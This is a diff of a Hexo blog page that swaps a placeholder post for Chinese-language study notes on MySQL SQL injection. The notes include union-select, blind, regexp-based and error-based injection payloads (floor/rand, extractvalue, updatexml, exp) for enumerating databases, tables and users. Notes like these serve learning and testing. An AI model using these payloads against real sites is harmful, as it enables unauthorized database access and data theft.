@@ -4,8 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="rust, Batman">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="sql注入笔记, Batman">
+    <meta name="description" content="
+常见函数
+concat() 格式：concat(id,’,’,name) 分隔符在中间位置 如果只给一个参数 它只会输出一个参数的值
+
+concat_ws() 格式：concat_ws(‘_’,id,name) 分割符在第一个参数 如果只">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>rust | Batman</title>
+    <title>sql注入笔记 | Batman</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -285,13 +289,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        rust
+                        sql注入笔记
                     </div>
                 </div>
             </div>
@@ -429,10 +433,46 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting]</p>
-<p><img src="/image/1.jpg" alt="Welcome"></p>
-<h1 id="欢迎"><a href="#欢迎" class="headerlink" title="欢迎"></a>欢迎</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import fmt</span><br><span class="line">fmt.println(&apos;haha&apos;)</span><br></pre></td></tr></table></figure>
-
+                <p><img src="/image/1.jpg" alt="sql注入"></p>
+<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><ul>
+<li><p>concat() 格式：concat(id,’,’,name) 分隔符在中间位置 如果只给一个参数 它只会输出一个参数的值</p>
+</li>
+<li><p>concat_ws() 格式：concat_ws(‘_’,id,name) 分割符在第一个参数 如果只给一个参数回报错</p>
+</li>
+<li><p>group_concat() 格式：group_concat(id,0x2b,name) 多个参数时 不加分隔符默认是连接在一起的 单个参数时会给出参数所有的值</p>
+</li>
+<li><p>union select 1,concat(schema_name),3 from information_schema.schemata 列出排位为第一个的数据库</p>
+</li>
+<li><p>union select 1,group_concat(schema_name),3 from information_schema.schemata 列出所有数据库</p>
+<p>如果不16进制就需要双引号包裹 但如果有addlashes函数就会把引号转义导致失效，16进制无论是字符型还是数字型都通用 就避免了失效这个问题</p>
+</li>
+</ul>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
+<li><p><code>mid()函数</code><br>格式如下：mid(column_name,start[,length])<br>column_name:想要获取的字段的名称，为必须参数<br>start:选择获取的起始位置<br>length:需要返回的字符数<br>例：and (mid(database(),1,1))=’s’ ,则字段第一位为s，测试第二位则修改start字段，payload为and (mid(database(),2,1))=’e’，以此类推。在实际应用中也可以添加ascii函数来帮助我们快速获取对应ascii码的值，例：and (ascii(mid(database(),1,1)))&gt;100<br>同样在column_name字段也可以构造sql语句，and (mid((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))&gt;’e’</p>
+</li>
+<li><p><code>substr()函数</code><br>substr()和substring()函数是同样的功能，均为截取字符<br>格式如下：substr(string,start,length)<br>string参数为需要获取的字符，start为起始的位置，length为截取的长度<br>例：and (substr(database(),1,1))&gt;’a’ ，同理mid()函数测试第二位则修改start参数，and (substr(database(),2,1))&gt;’a’<br>同样在string字段也可以构造sql语句，and (substr((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1,1))=’e’</p>
+</li>
+<li><p><code>left()函数</code><br>left()得到字符串左部指定个数的字符<br>格式如下：<br>left(string,n),string为要获取的字段,n为长度<br>例：and (left(database(),1))&gt;’s’ ，确定了第一位，测试一、二位则修改n字段，and (left(database(),2))&gt;’se’，以此类推<br>同样在string字段也可以构造sql语句，and (left((select table_name from INFORMATION_SCHEMA.TABLES where table_schema=’security’ limit 0,1),1))&gt;’a’</p>
+</li>
+<li><p><code>ord()函数</code><br>此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用，例：and (ord(left(database(),1)))&gt;100</p>
+</li>
+</ul>
+<h2 id="正则表达式注入"><a href="#正则表达式注入" class="headerlink" title="正则表达式注入"></a>正则表达式注入</h2><ul>
+<li><p>跑表名：<br>and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^em[a-z]’)</p>
+</li>
+<li><p>跑字段名：<br>and 1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘^a[a-z]’ limit 0,1)<br>需要注意的是使用regexp在跑表名的时候，因为前面的已经加了条件数据库指明为security，且返回列只有数据库名，所有不需要limit来限定区域，但在跑字段名时就算前面加了条件限制了表名为user，但返回的列不止一行，所有就需要使用limit来再次限制区域。<br><code>limit：</code><br>SELECT * from 表名 WHERE 条件 limit 5,10; //检索6-15条数据<br>SELECT * from 表名 WHERE 条件 limit 5,-1; //检索6到最后一条数据<br>SELECT * from 表名 WHERE 条件 limit 5; //检索前5条数据<br>具体如下图：</p>
+</li>
+</ul>
+<p><img src="/image/1.jpg" alt="如图"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
+<li><p><code>floor()函数</code><br>只要是count，rand()，group by三个连用就会造成报错，这种报错方法的本质是因为floor(rand(0)<em>2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据，具体payload如下：<br>and (select count(</em>) from information_schema.<code>tables</code> group by concat((select version()),floor(rand(0)*2)))</p>
+</li>
+<li><p><code>extractvalue和updatexml函数</code><br>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml，<br>样式如下：<br>select extractvalue(1,’/a/b’);<br>select updatexml(1,’/a/b’,1);<br>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里<br><code>Extractvalue()</code><br>用法：and (select extractvalue(1,concat(0x7e,(select user()),0x7e)))<br><code>Updatexml()</code><br>用法：and (select updatexml(1,concat(0x7e,(select user()),0x7e),1))</p>
+</li>
+<li><p><code>exp()</code><br>只有在mysql版本大于5.5.5时，才可以使用整形溢出报错<br>Exp()<br>用法：mysql&gt; select exp(~(select*from(select user())x));<br>ps：但不知道为什么在mysql 5.5.53版本使用失败</p>
+</li>
+</ul>
+<p>参考：<br><a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p>
 
             </div>
             <hr/>
@@ -467,7 +507,7 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《rust》
+                    《sql注入笔记》
                 </span> 由
             <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/11/rust/" property="cc:attributionName"
                rel="cc:attributionURL">
@@ -518,15 +558,19 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="rust">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="sql注入笔记">
                         
-                        <span class="card-title">rust</span>
+                        <span class="card-title">sql注入笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                            
+常见函数
+concat() 格式：concat(id,’,’,name) 分隔符在中间位置 如果只给一个参数 它只会输出一个参数的值
+
+concat_ws() 格式：concat_ws(‘_’,id,name) 分割符在第一个参数 如果只
                         
                     </div>
                     <div class="publish-info">
